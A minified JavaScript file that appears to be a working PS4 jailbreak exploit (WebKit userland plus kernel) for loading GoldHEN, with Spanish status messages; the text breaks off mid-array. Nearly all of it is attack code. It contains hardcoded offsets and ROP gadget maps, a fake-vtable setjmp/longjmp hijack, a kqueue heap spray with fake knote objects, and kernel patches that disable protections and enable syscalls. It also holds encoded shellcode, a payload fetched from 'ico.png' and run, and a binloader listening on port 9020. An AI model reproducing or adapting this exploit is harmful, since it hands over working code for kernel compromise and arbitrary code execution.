const OFFSET_wk_vtable_first_element=17101072;const OFFSET_WK_memset_import=680;const OFFSET_WK___stack_chk_fail_import=376;const OFFSET_WK_psl_builtin_import=3432;const OFFSET_WKR_psl_builtin=211872;const OFFSET_WK_setjmp_gadget_one=17214711;const OFFSET_WK_setjmp_gadget_two=32301523;const OFFSET_WK_longjmp_gadget_one=17214711;const OFFSET_WK_longjmp_gadget_two=32301523;const OFFSET_libcint_memset=325648;const OFFSET_libcint_setjmp=767420;const OFFSET_libcint_longjmp=767510;const OFFSET_WK2_TLS_IMAGE=59670560;const OFFSET_lk___stack_chk_fail=130912;const OFFSET_lk_pthread_create=152848;const OFFSET_lk_pthread_join=44960;var chain;var kchain;var kchain2;var SAVED_KERNEL_STACK_PTR;var KERNEL_BASE_PTR;var webKitBase;var webKitRequirementBase;var libSceLibcInternalBase;var libKernelBase;var textArea=document.createElement("textarea");var nogc=[];var syscalls={};var gadgets={};var wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255,"mov [rax], cl":814767};var wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480};var wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538};var hmd_gadgetmap={"add [r8], r12":179425};var ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function CalcTime(dur){hrs=Math.floor(dur/1e3/60/60);min=Math.floor(dur/1e3/60-hrs*60);sec=Math.floor(dur/1e3-min*60);mil=dur.toString().slice(-3);if(min!=0){ShowDuration=" - Webkit activado en : "+min+" minute"+(min==1?"":"s")+", "+sec+" segundo"+(sec==1?"":"s")}else{ShowDuration=" - Webkit activado en: "+sec+" segundo"+(sec==1?"":"s")}}function StartTimer(){StartTime=Date.now()}function EndTimer(){EndTime=Date.now();CalcTime(EndTime=Date.now()-StartTime);top.document.title+=ShowDuration}function allset(){localStorage.HenLoaded="yes";sessionStorage.HenLoaded="yes";msgs.innerHTML="PS4 Exploit y GoldHEN activado."}function awaitpl(){msgs.innerHTML="GoldHEN y BinLoader est&aacute;n listo.<br>Env&iacute;e payload por el puerto 9020"}function run_hax(){userland();if(chain.syscall(23,0).low!=0){localStorage.HenLoaded="no";kernelExploit()}if(chain.syscall(23,0).low==0){if(localStorage.HenLoaded=="yes"&&sessionStorage.HenLoaded!="yes"){setTimeout(runBinLoader,500)}else if(localStorage.HenLoaded=="yes"&&sessionStorage.HenLoaded=="yes"){allset()}else if(localStorage.HenLoaded!="yes"){setTimeout(loadPayload,500)}}}function runBinLoader(){var payload_buffer=chain.syscall(477,0,3145728,7,4096,4294967295,0);var payload_loader=p.malloc32(4096);var BLDR=payload_loader.backing;BLDR[0]=1447122753;BLDR[1]=2202555713;BLDR[2]=2303203564;BLDR[3]=3343393852;BLDR[4]=268969028;BLDR[5]=1211900674;BLDR[6]=270812359;BLDR[7]=0;BLDR[8]=703;BLDR[9]=114176;BLDR[10]=3526426624;BLDR[11]=40168;BLDR[12]=3347661056;BLDR[13]=2370357129;BLDR[14]=3121095796;BLDR[15]=16;BLDR[16]=38376;BLDR[17]=4287185920;BLDR[18]=446;BLDR[19]=9824256;BLDR[20]=2302935040;BLDR[21]=838218239;BLDR[22]=6482130;BLDR[23]=2302738432;BLDR[24]=747326662;BLDR[25]=1170620708;BLDR[26]=99336960;BLDR[27]=21600328;BLDR[28]=4152968389;BLDR[29]=3136194892;BLDR[30]=4096;BLDR[31]=9704;BLDR[32]=2143323392;BLDR[33]=4287186151;BLDR[34]=9960;BLDR[35]=4152968192;BLDR[36]=7912;BLDR[37]=605355776;BLDR[38]=415531848;BLDR[39]=1581342017;BLDR[40]=826826561;BLDR[41]=3343434688;BLDR[42]=960;BLDR[43]=3397994752;BLDR[44]=1220740367;BLDR[45]=442567;BLDR[46]=2303262720;BLDR[47]=3271888842;BLDR[48]=515950408;BLDR[49]=1224736768;BLDR[50]=84920969;BLDR[51]=3234285763;BLDR[52]=97;BLDR[53]=264931657;BLDR[54]=3343434501;BLDR[55]=26816;BLDR[56]=3397994752;BLDR[57]=1220740367;BLDR[58]=6996167;BLDR[59]=2303262720;BLDR[60]=3271888842;chain.syscall(74,payload_loader,16384,1|2|4);var pthread=p.malloc(16);{chain.fcall(window.syscalls[203],payload_buffer,3145728);chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0,payload_loader,payload_buffer)}chain.run();awaitpl()}function loadPayload(){var req=new XMLHttpRequest;req.responseType="arraybuffer";req.open("GET","ico.png");req.send();req.onreadystatechange=function(){if(req.readyState==4){PLD=req.response;var payload_buffer=chain.syscall(477,0,PLD.byteLength*4,7,4098,-1,0);var pl=p.array_from_address(payload_buffer,PLD.byteLength*4);var padding=new Uint8Array(4-req.response.byteLength%4%4);var tmp=new Uint8Array(req.response.byteLength+padding.byteLength);tmp.set(new Uint8Array(req.response),0);tmp.set(padding,req.response.byteLength);var shellcode=new Uint32Array(tmp.buffer);pl.set(shellcode,0);var pthread=p.malloc(16);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0,payload_buffer,0);allset()}}}function int64(low,hi){this.low=low>>>0;this.hi=hi>>>0;this.add32inplace=function(val){var new_lo=((this.low>>>0)+val&4294967295)>>>0;var new_hi=this.hi>>>0;if(new_lo<this.low){new_hi++}this.hi=new_hi;this.low=new_lo};this.add32=function(val){var new_lo=((this.low>>>0)+val&4294967295)>>>0;var new_hi=this.hi>>>0;if(new_lo<this.low){new_hi++}return new int64(new_lo,new_hi)};this.sub32=function(val){var new_lo=((this.low>>>0)-val&4294967295)>>>0;var new_hi=this.hi>>>0;if(new_lo>this.low&4294967295){new_hi--}return new int64(new_lo,new_hi)};this.sub32inplace=function(val){var new_lo=((this.low>>>0)-val&4294967295)>>>0;var new_hi=this.hi>>>0;if(new_lo>this.low&4294967295){new_hi--}this.hi=new_hi;this.low=new_lo};this.and32=function(val){var new_lo=this.low&val;var new_hi=this.hi;return new int64(new_lo,new_hi)};this.and64=function(vallo,valhi){var new_lo=this.low&vallo;var new_hi=this.hi&valhi;return new int64(new_lo,new_hi)};function zeroFill(number,width){width-=number.toString().length;if(width>0){return new Array(width+(/\./.test(number)?2:1)).join("0")+number}return number+""}this.toString=function(val){val=16;var lo_str=(this.low>>>0).toString(val);var hi_str=(this.hi>>>0).toString(val);if(this.hi==0)return lo_str;else lo_str=zeroFill(lo_str,8);return hi_str+lo_str};return this}window.rop=function(){const stack_sz=262144;const reserve_upper_stack=65536;const stack_reserved_idx=reserve_upper_stack/4;this.stackback=p.malloc32(stack_sz/4+8);this.stack=this.stackback.add32(reserve_upper_stack);this.stack_array=this.stackback.backing;this.retval=this.stackback.add32(stack_sz);this.count=1;this.branches_count=0;this.branches_rsps=p.malloc(512);this.clear=function(){this.count=1;this.branches_count=0;for(var i=1;i<stack_sz/4-stack_reserved_idx;i++){this.stack_array[i+stack_reserved_idx]=0}};this.pushSymbolic=function(){this.count++;return this.count-1};this.finalizeSymbolic=function(idx,val){if(val instanceof int64){this.stack_array[stack_reserved_idx+idx*2]=val.low;this.stack_array[stack_reserved_idx+idx*2+1]=val.hi}else{this.stack_array[stack_reserved_idx+idx*2]=val;this.stack_array[stack_reserved_idx+idx*2+1]=0}};this.push=function(val){this.finalizeSymbolic(this.pushSymbolic(),val)};this.push_write8=function(where,what){this.push(gadgets["pop rdi"]);this.push(where);this.push(gadgets["pop rsi"]);this.push(what);this.push(gadgets["mov [rdi], rsi"])};this.fcall=function(rip,rdi,rsi,rdx,rcx,r8,r9){if(rdi!=undefined){this.push(gadgets["pop rdi"]);this.push(rdi)}if(rsi!=undefined){this.push(gadgets["pop rsi"]);this.push(rsi)}if(rdx!=undefined){this.push(gadgets["pop rdx"]);this.push(rdx)}if(rcx!=undefined){this.push(gadgets["pop rcx"]);this.push(rcx)}if(r8!=undefined){this.push(gadgets["pop r8"]);this.push(r8)}if(r9!=undefined){this.push(gadgets["pop r9"]);this.push(r9)}if(this.stack.add32(this.count*8).low&8){this.push(gadgets["ret"])}this.push(rip);return this};this.call=function(rip,rdi,rsi,rdx,rcx,r8,r9){this.fcall(rip,rdi,rsi,rdx,rcx,r8,r9);this.write_result(this.retval);this.run();return p.read8(this.retval)};this.syscall=function(sysc,rdi,rsi,rdx,rcx,r8,r9){return this.call(window.syscalls[sysc],rdi,rsi,rdx,rcx,r8,r9)};this.get_rsp=function(){return this.stack.add32(this.count*8)};this.write_result=function(where){this.push(gadgets["pop rdi"]);this.push(where);this.push(gadgets["mov [rdi], rax"])};this.write_result4=function(where){this.push(gadgets["pop rdi"]);this.push(where);this.push(gadgets["mov [rdi], eax"])};this.jmp_rsp=function(rsp){this.push(window.gadgets["pop rsp"]);this.push(rsp)};this.run=function(){p.launch_chain(this);this.clear()};this.KERNEL_BASE_PTR_VAR;this.set_kernel_var=function(arg){this.KERNEL_BASE_PTR_VAR=arg};this.rax_kernel=function(offset){this.push(gadgets["pop rax"]);this.push(this.KERNEL_BASE_PTR_VAR);this.push(gadgets["mov rax, [rax]"]);this.push(gadgets["pop rsi"]);this.push(offset);this.push(gadgets["add rax, rsi"])};this.write_kernel_addr_to_chain_later=function(offset){this.push(gadgets["pop rdi"]);var idx=this.pushSymbolic();this.rax_kernel(offset);this.push(gadgets["mov [rdi], rax"]);return idx};this.kwrite8=function(offset,qword){this.rax_kernel(offset);this.push(gadgets["pop rsi"]);this.push(qword);this.push(gadgets["mov [rax], rsi"])};this.kwrite4=function(offset,dword){this.rax_kernel(offset);this.push(gadgets["pop rdx"]);this.push(dword);this.push(gadgets["mov [rax], edx"])};this.kwrite2=function(offset,word){this.rax_kernel(offset);this.push(gadgets["pop rcx"]);this.push(word);this.push(gadgets["mov [rax], cx"])};this.kwrite1=function(offset,byte){this.rax_kernel(offset);this.push(gadgets["pop rcx"]);this.push(byte);this.push(gadgets["mov [rax], cl"])};this.kwrite8_kaddr=function(offset1,offset2){this.rax_kernel(offset2);this.push(gadgets["mov rdx, rax"]);this.rax_kernel(offset1);this.push(gadgets["mov [rax], rdx"])};return this};function userland(){p.launch_chain=launch_chain;p.malloc=malloc;p.malloc32=malloc32;p.stringify=stringify;p.array_from_address=array_from_address;p.readstr=readstr;var textAreaVtPtr=p.read8(p.leakval(textArea).add32(24));var textAreaVtable=p.read8(textAreaVtPtr);webKitBase=p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);libSceLibcInternalBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);libKernelBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);webKitRequirementBase=p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);for(var gadget in wk_gadgetmap){window.gadgets[gadget]=webKitBase.add32(wk_gadgetmap[gadget])}for(var gadget in wkr_gadgetmap){window.gadgets[gadget]=webKitRequirementBase.add32(wkr_gadgetmap[gadget])}function get_jmptgt(address){var instr=p.read4(address)&65535;var offset=p.read4(address.add32(2));if(instr!=9727){return 0}return address.add32(6+offset)}function malloc(sz){var backing=new Uint8Array(65536+sz);window.nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=backing;return ptr}function malloc32(sz){var backing=new Uint8Array(65536+sz*4);window.nogc.push(backing);var ptr=p.read8(p.leakval(backing).add32(16));ptr.backing=new Uint32Array(backing.buffer);return ptr}function array_from_address(addr,size){var og_array=new Uint32Array(4096);var og_array_i=p.leakval(og_array).add32(16);p.write8(og_array_i,addr);p.write4(og_array_i.add32(8),size);p.write4(og_array_i.add32(12),1);nogc.push(og_array);return og_array}function stringify(str){var bufView=new Uint8Array(str.length+1);for(var i=0;i<str.length;i++){bufView[i]=str.charCodeAt(i)&255}window.nogc.push(bufView);return p.read8(p.leakval(bufView).add32(16))}function readstr(addr){var str="";for(var i=0;;i++){var c=p.read1(addr.add32(i));if(c==0){break}str+=String.fromCharCode(c)}return str}var fakeVtable_setjmp=p.malloc32(512);var fakeVtable_longjmp=p.malloc32(512);var original_context=p.malloc32(64);var modified_context=p.malloc32(64);p.write8(fakeVtable_setjmp.add32(0),fakeVtable_setjmp);p.write8(fakeVtable_setjmp.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two));p.write8(fakeVtable_setjmp.add32(16),original_context);p.write8(fakeVtable_setjmp.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));p.write8(fakeVtable_setjmp.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one));p.write8(fakeVtable_longjmp.add32(0),fakeVtable_longjmp);p.write8(fakeVtable_longjmp.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two));p.write8(fakeVtable_longjmp.add32(16),modified_context);p.write8(fakeVtable_longjmp.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));p.write8(fakeVtable_longjmp.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));function launch_chain(chain){chain.push(window.gadgets["pop rdi"]);chain.push(original_context);chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));p.write8(textAreaVtPtr,fakeVtable_setjmp);textArea.scrollLeft=0;p.write8(modified_context.add32(0),window.gadgets["ret"]);p.write8(modified_context.add32(16),chain.stack);p.write8(modified_context.add32(64),p.read8(original_context.add32(64)));p.write8(textAreaVtPtr,fakeVtable_longjmp);textArea.scrollLeft=0;p.write8(textAreaVtPtr,textAreaVtable)}var kview=new Uint8Array(4096);var kstr=p.leakval(kview).add32(16);var orig_kview_buf=p.read8(kstr);p.write8(kstr,window.libKernelBase);p.write4(kstr.add32(8),262144);var countbytes;for(var i=0;i<262144;i++){if(kview[i]==114&&kview[i+1]==100&&kview[i+2]==108&&kview[i+3]==111&&kview[i+4]==99){countbytes=i;break}}p.write4(kstr.add32(8),countbytes+32);var dview32=new Uint32Array(1);var dview8=new Uint8Array(dview32.buffer);for(var i=0;i<countbytes;i++){if(kview[i]==72&&kview[i+1]==199&&kview[i+2]==192&&kview[i+7]==73&&kview[i+8]==137&&kview[i+9]==202&&kview[i+10]==15&&kview[i+11]==5){dview8[0]=kview[i+3];dview8[1]=kview[i+4];dview8[2]=kview[i+5];dview8[3]=kview[i+6];var syscallno=dview32[0];window.syscalls[syscallno]=window.libKernelBase.add32(i)}}p.write8(kstr,orig_kview_buf);chain=new rop;if(chain.syscall(20).low==0){alert("Webkit Exploit Fallido. Intentalo otra vez.");while(1);}}function kernelExploit(){var handle;var random_path;var ex_info;function load_prx(name){var res=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${name}`),0,handle,0);if(res.low!=0){alert("failed to load prx/get handle "+name)}p.write8(ex_info,424);res=chain.syscall(608,p.read4(handle),0,ex_info);if(res.low!=0){alert("failed to get module info from handle")}var tlsinit=p.read8(ex_info.add32(272));var tlssize=p.read4(ex_info.add32(284));if(tlssize!=0){if(name=="libSceWebKit2.sprx"){tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE)}else{alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`)}}return tlsinit}function extra_gadgets(){handle=p.malloc(488);var randomized_path_length_ptr=handle.add32(4);var randomized_path_ptr=handle.add32(20);ex_info=randomized_path_ptr.add32(64);p.write8(randomized_path_length_ptr,44);chain.syscall(602,0,randomized_path_ptr,randomized_path_length_ptr);random_path=p.readstr(randomized_path_ptr);var ipmi_addr=load_prx("libSceIpmi.sprx");var hmd_addr=load_prx("libSceHmd.sprx");var wk2_addr=load_prx("libSceWebKit2.sprx");for(var gadget in hmd_gadgetmap){window.gadgets[gadget]=hmd_addr.add32(hmd_gadgetmap[gadget])}for(var gadget in wk2_gadgetmap){window.gadgets[gadget]=wk2_addr.add32(wk2_gadgetmap[gadget])}for(var gadget in ipmi_gadgetmap){window.gadgets[gadget]=ipmi_addr.add32(ipmi_gadgetmap[gadget])}for(var gadget in window.gadgets){p.read8(window.gadgets[gadget]);chain.fcall(window.syscalls[203],window.gadgets[gadget],16)}chain.run()}function kchain_setup(){const KERNEL_busy=28478968;const KERNEL_bcopy=2765;const KERNEL_bzero=2561021;const KERNEL_pagezero=2561089;const KERNEL_memcpy=2561213;const KERNEL_pagecopy=2561281;const KERNEL_copyin=2561709;const KERNEL_copyinstr=2562909;const KERNEL_copystr=2563117;const KERNEL_setidt=3222592;const KERNEL_setcr0=2079049;const KERNEL_Xill=1561856;const KERNEL_veriPatch=6449268;const KERNEL_enable_syscalls_1=1168;const KERNEL_enable_syscalls_2=1205;const KERNEL_enable_syscalls_3=1209;const KERNEL_enable_syscalls_4=1218;const KERNEL_mprotect=527245;const KERNEL_prx=2338500;const KERNEL_dlsym_1=2340479;const KERNEL_dlsym_2=2235200;const KERNEL_setuid=6662;const KERNEL_syscall11_1=17827104;const KERNEL_syscall11_2=17827112;const KERNEL_syscall11_3=17827148;const KERNEL_syscall11_gadget=313261;const KERNEL_mmap_1=1467178;const KERNEL_mmap_2=1467181;const KERNEL_setcr0_patch=3857979;const KERNEL_kqueue_close_epi=3770769;SAVED_KERNEL_STACK_PTR=p.malloc(512);KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8);p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295));kchain=new rop;kchain2=new rop;{chain.fcall(window.syscalls[203],kchain.stackback,262144);chain.fcall(window.syscalls[203],kchain2.stackback,262144);chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16)}chain.run();kchain.count=0;kchain2.count=0;kchain.set_kernel_var(KERNEL_BASE_PTR);kchain2.set_kernel_var(KERNEL_BASE_PTR);kchain.push(gadgets["pop rax"]);kchain.push(SAVED_KERNEL_STACK_PTR);kchain.push(gadgets["mov [rax], rdi"]);kchain.push(gadgets["pop r8"]);kchain.push(KERNEL_BASE_PTR);kchain.push(gadgets["add [r8], r12"]);kchain.kwrite1(KERNEL_busy,1);kchain.push(gadgets["sti"]);var idx1=kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);var idx2=kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);kchain.push(gadgets["pop rdi"]);kchain.push(6);kchain.push(gadgets["pop rsi"]);kchain.push(gadgets["mov rsp, rdi"]);kchain.push(gadgets["pop rdx"]);kchain.push(14);kchain.push(gadgets["pop rcx"]);kchain.push(0);kchain.push(gadgets["pop r8"]);kchain.push(0);var idx1_dest=kchain.get_rsp();kchain.pushSymbolic();kchain.push(gadgets["pop rsi"]);kchain.push(2147745843);kchain.push(gadgets["pop rdi"]);kchain.push(kchain2.stack);var idx2_dest=kchain.get_rsp();kchain.pushSymbolic();kchain.finalizeSymbolic(idx1,idx1_dest);kchain.finalizeSymbolic(idx2,idx2_dest);kchain2.kwrite2(KERNEL_veriPatch,37008);kchain2.kwrite1(KERNEL_bcopy,235);kchain2.kwrite1(KERNEL_bzero,235);kchain2.kwrite1(KERNEL_pagezero,235);kchain2.kwrite1(KERNEL_memcpy,235);kchain2.kwrite1(KERNEL_pagecopy,235);kchain2.kwrite1(KERNEL_copyin,235);kchain2.kwrite1(KERNEL_copyinstr,235);kchain2.kwrite1(KERNEL_copystr,235);kchain2.kwrite1(KERNEL_busy,0);var idx3=kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);var idx4=kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);kchain2.push(gadgets["pop rdi"]);kchain2.push(6);kchain2.push(gadgets["pop rsi"]);var idx3_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.push(gadgets["pop rdx"]);kchain2.push(14);kchain2.push(gadgets["pop rcx"]);kchain2.push(0);kchain2.push(gadgets["pop r8"]);kchain2.push(0);var idx4_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx3,idx3_dest);kchain2.finalizeSymbolic(idx4,idx4_dest);kchain2.kwrite4(KERNEL_enable_syscalls_1,0);kchain2.kwrite1(KERNEL_enable_syscalls_4,235);kchain2.kwrite2(KERNEL_enable_syscalls_3,37008);kchain2.kwrite2(KERNEL_enable_syscalls_2,37008);kchain2.kwrite1(KERNEL_setuid,235);kchain2.kwrite4(KERNEL_mprotect,0);kchain2.kwrite2(KERNEL_prx,59792);kchain2.kwrite1(KERNEL_dlsym_1,235);kchain2.kwrite4(KERNEL_dlsym_2,3284152648);kchain2.kwrite1(KERNEL_mmap_1,55);kchain2.kwrite1(KERNEL_mmap_2,55);kchain2.kwrite4(KERNEL_syscall11_1,2);kchain2.kwrite8_kaddr(KERNEL_syscall11_2,KERNEL_syscall11_gadget);kchain2.kwrite4(KERNEL_syscall11_3,1);kchain2.kwrite4(KERNEL_setcr0_patch,3284607503);var idx5=kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);kchain2.push(gadgets["pop rdi"]);kchain2.push(2147811379);var idx5_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx5,idx5_dest);kchain2.rax_kernel(KERNEL_kqueue_close_epi);kchain2.push(gadgets["mov rdx, rax"]);kchain2.push(gadgets["pop rsi"]);kchain2.push(SAVED_KERNEL_STACK_PTR);kchain2.push(gadgets["mov rax, [rsi]"]);kchain2.push(gadgets["pop rcx"]);kchain2.push(16);kchain2.push(gadgets["add rax, rcx"]);kchain2.push(gadgets["mov [rax], rdx"]);kchain2.push(gadgets["pop rdi"]);var idx6=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]);kchain2.push(gadgets["sti"]);kchain2.push(gadgets["pop rsp"]);var idx6_dest=kchain2.get_rsp();kchain2.pushSymbolic();kchain2.finalizeSymbolic(idx6,idx6_dest)}function object_setup(){var fake_knote=chain.syscall(477,16384,16384*3,3,4112,4294967295,0);var fake_filtops=fake_knote.add32(16384);var fake_obj=fake_knote.add32(32768);if(fake_knote.low!=16384){alert("enomem: "+fake_knote);while(1);}{p.write8(fake_knote,fake_obj);p.write8(fake_knote.add32(104),fake_filtops)}{p.write8(fake_filtops.sub32(121),gadgets["cli ; pop rax"]);p.write8(fake_filtops.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]);p.write8(fake_filtops.add32(8),kchain.stack);p.write8(fake_filtops.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"])}{p.write8(fake_obj.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"])}chain.syscall(203,fake_knote,49152)}var trigger_spray=function(){var NUM_KQUEUES=432;var kqueue_ptr=p.malloc(NUM_KQUEUES*4);{for(var i=0;i<NUM_KQUEUES;i++){chain.fcall(window.syscalls[362]);chain.write_result4(kqueue_ptr.add32(4*i))}}chain.run();var kqueues=p.array_from_address(kqueue_ptr,NUM_KQUEUES);var that_one_socket=chain.syscall(97,2,1,0);if(that_one_socket.low<256||that_one_socket.low>=512){alert("invalid socket");while(1);}var kevent=p.malloc(32);p.write8(kevent.add32(0),that_one_socket);p.write4(kevent.add32(8),65535+65536);p.write4(kevent.add32(12),0);p.write8(kevent.add32(16),0);p.write8(kevent.add32(24),0);for(var i=0;i<NUM_KQUEUES;i++)chain.fcall(window.syscalls[363],kqueues[i],kevent,1,0,0,0);for(var i=18;i<NUM_KQUEUES;i+=2)chain.fcall(window.syscalls[6],kqueues[i]);chain.run();msgs.innerHTML="1. Inserte el USB y luego ret&iacute;relo despu&eacute;s de que la notificaci&oacute;n haya desaparecido.<br>2. Presione 'X' despu&eacute;s de haber quitado el USB";return new Promise((resolve,reject)=>{document.body.addEventListener("click",function(e){for(var i=1;i<NUM_KQUEUES;i+=2)chain.fcall(window.syscalls[6],kqueues[i]);chain.run();if(chain.syscall(23,0).low==0){chain.fcall(window.syscalls[73],16384,49152);chain.fcall(window.syscalls[325]);var patch_buffer=chain.syscall(477,0,16384,7,4096,4294967295,0);var PBV=p.array_from_address(patch_buffer,4096);PBV[0]=3e3;PBV[1]=4270409728;PBV[2]=54365512;PBV[3]=251658240;PBV[4]=1213580037;PBV[5]=2336810377;PBV[6]=2515011710;PBV[7]=3892314112;PBV[8]=373;PBV[9]=53876223;PBV[10]=2336751616;PBV[11]=210749;PBV[12]=1066092544;PBV[13]=1962902856;PBV[14]=1032669419;PBV[15]=669;PBV[16]=4181035848;PBV[17]=1207959554;PBV[18]=52565387;PBV[19]=2336751616;PBV[20]=14084114;PBV[21]=2370306048;PBV[22]=171837;PBV[23]=898320384;PBV[24]=740;PBV[25]=85297992;PBV[26]=1207959555;PBV[27]=3118994059;PBV[28]=1207959552;PBV[29]=40058253;PBV[30]=2336751616;PBV[31]=180021;PBV[32]=361449472;PBV[33]=712;PBV[34]=3893529416;PBV[35]=156;PBV[36]=2050854216;PBV[37]=1207959554;PBV[38]=44709259;PBV[39]=2336751616;PBV[40]=174869;PBV[41]=311117824;PBV[42]=32744;PBV[43]=25552896;PBV[44]=3277651968;PBV[45]=1832749384;PBV[46]=1207959554;PBV[47]=40779009;PBV[48]=21495808;PBV[49]=159549;PBV[50]=1023494144;PBV[51]=624;PBV[52]=1899823432;PBV[53]=1207959554;PBV[54]=41041153;PBV[55]=21495808;PBV[56]=168765;PBV[57]=1023494144;PBV[58]=660;PBV[59]=1698496840;PBV[60]=1207959554;PBV[61]=40254721;PBV[62]=21495808;PBV[63]=165693;PBV[64]=1023494144;PBV[65]=648;PBV[66]=2302476616;PBV[67]=1207959554;PBV[68]=42614017;PBV[69]=21495808;PBV[70]=166717;PBV[71]=1023494144;PBV[72]=588;PBV[73]=1027408200;PBV[74]=3271557122;PBV[75]=3850979413;PBV[76]=283935560;PBV[77]=607422792;PBV[78]=609519944;PBV[79]=3977641736;PBV[80]=1207959553;PBV[81]=1265942661;PBV[82]=1220708680;PBV[83]=1212170379;PBV[84]=796180613;PBV[85]=678988616;PBV[86]=607927112;PBV[87]=2336754292;PBV[88]=3229960192;PBV[89]=3974831476;PBV[90]=410553160;PBV[91]=1962902856;PBV[92]=2139834605;PBV[93]=2084259856;PBV[94]=3799320612;PBV[95]=4279255239;PBV[96]=1224736767;PBV[97]=823163533;PBV[98]=835858934;PBV[99]=2769682377;PBV[100]=1207959553;PBV[101]=1561379971;PBV[102]=2303219139;PBV[103]=3223326693;PBV[104]=4294911304;PBV[105]=571473918;PBV[106]=1032538304;PBV[107]=456;PBV[108]=2425358279;PBV[109]=1204261008;PBV[110]=1217433604;PBV[111]=898320568;PBV[112]=428;PBV[113]=142051656;PBV[114]=1695565767;PBV[115]=3342633800;PBV[116]=2430023;PBV[117]=1204224e3;PBV[118]=2303197208;PBV[119]=474466104;PBV[120]=3091763344;PBV[121]=2100661064;PBV[122]=1207959553;PBV[123]=3340793737;PBV[124]=3343394887;PBV[125]=1204224256;PBV[126]=44;PBV[127]=2005747945;PBV[128]=361449524;PBV[129]=336;PBV[130]=2314348872;PBV[131]=2336763991;PBV[132]=92981;PBV[133]=1452099584;PBV[134]=3609806853;PBV[135]=3242786697;PBV[136]=2168981735;PBV[137]=59855;PBV[138]=1049184256;PBV[139]=3400;PBV[140]=571408385;PBV[141]=1438866880;PBV[142]=266701128;PBV[143]=625524768;PBV[144]=4294901759;PBV[145]=1220551183;PBV[146]=20594059;PBV[147]=130482176;PBV[148]=12828721;PBV[149]=893225800;PBV[150]=3338665985;PBV[151]=3284152583;PBV[152]=1032538112;PBV[153]=304;PBV[154]=3224438727;PBV[155]=2336751811;PBV[156]=76605;PBV[157]=822593280;PBV[158]=1208009664;PBV[159]=10894731;PBV[160]=2277965824;PBV[161]=2039297;PBV[162]=2425419313;PBV[163]=503678919;PBV[164]=3375431711;PBV[165]=2278002832;PBV[166]=2039305;PBV[167]=2425410097;PBV[168]=507414471;PBV[169]=3375431711;PBV[170]=222859408;PBV[171]=65536;PBV[172]=4290781711;PBV[173]=61205;PBV[174]=3223326464;PBV[175]=4294911304;PBV[176]=571473918;PBV[177]=1032538304;PBV[178]=220;PBV[179]=3224438727;PBV[180]=222822595;PBV[181]=65536;PBV[182]=1572872719;PBV[183]=1937339331;PBV[184]=1601004916;PBV[185]=1886614899;PBV[186]=1600417381;PBV[187]=1935763568;PBV[188]=1885287013;PBV[189]=1935631730;PBV[190]=6516345;PBV[191]=1953724787;PBV[192]=1918856549;PBV[193]=1836413797;PBV[194]=1752194917;PBV[195]=845509473;PBV[196]=1937339136;PBV[197]=1601004916;PBV[198]=1970496882;PBV[199]=1885300077;PBV[200]=1702060392;PBV[201]=2425356339;PBV[202]=0;PBV[203]=0;PBV[204]=1018096;PBV[205]=0;PBV[206]=3076464;PBV[207]=0;PBV[208]=101872;PBV[209]=0;PBV[210]=102128;PBV[211]=0;PBV[212]=40190224;PBV[213]=0;PBV[214]=619056;PBV[215]=0;PBV[216]=4206176;PBV[217]=0;PBV[218]=22151432;PBV[219]=0;PBV[220]=22151424;PBV[221]=0;PBV[222]=4599072;PBV[223]=0;PBV[224]=4599292;PBV[225]=0;PBV[226]=6445472;PBV[227]=0;PBV[228]=6449360;PBV[229]=0;PBV[230]